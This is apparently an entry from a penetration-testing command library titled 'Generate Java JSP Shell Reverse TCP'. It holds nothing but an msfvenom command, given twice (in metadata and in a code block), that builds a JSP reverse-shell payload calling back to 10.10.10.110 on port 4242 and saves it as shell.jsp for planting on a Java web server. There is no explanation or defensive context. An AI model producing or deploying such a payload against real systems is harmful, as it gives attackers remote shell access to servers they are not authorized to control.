---
id: 5283846c-a3ff-4128-9d42-1b1739d1dbe4
name: Generate Java JSP Shell Reverse TCP
type: command
executor: bash
data: $ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f
  raw > shell.jsp
output: null
created_at: '2023-04-06T03:56:21.275510+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
---

# Generate Java JSP Shell Reverse TCP

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
```
